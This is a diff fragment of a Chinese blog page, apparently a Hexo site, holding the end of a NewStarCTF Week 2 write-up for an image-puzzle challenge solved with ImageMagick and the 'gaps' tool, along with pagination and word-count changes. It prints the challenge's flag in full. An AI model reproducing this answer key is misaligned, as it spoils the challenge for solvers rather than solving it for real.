+<h4 id="Coldwinds’s-Desktop"><a href="#Coldwinds’s-Desktop" class="headerlink" title="Coldwinds’s Desktop"></a>Coldwinds’s Desktop</h4><p>使用magick将144张图片拼凑到一起</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-48.png"></p>
+<p>得到flag.png</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-49.png"></p>
+<p>再使用gaps工具还原原图</p>
+<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK2-WP/image-50.png"></p>
+<p>最后可以得到flag为<code>flag&#123;Y0u_successfu11y_s01ved_the_puzz1e&#125;</code>这个flag我真的是服了，想暴打出题人。</p>
+<p>这一周的解题都在这里了，还是比较废物。好好加油吧！</p>
 
       
     </div>
@@ -743,7 +421,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/29/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><span class="page-number current">30</span><a class="page-number" href="/page/31/">31</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/31/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/29/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><span class="page-number current">30</span><a class="page-number" href="/page/31/">31</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/31/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -767,7 +445,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
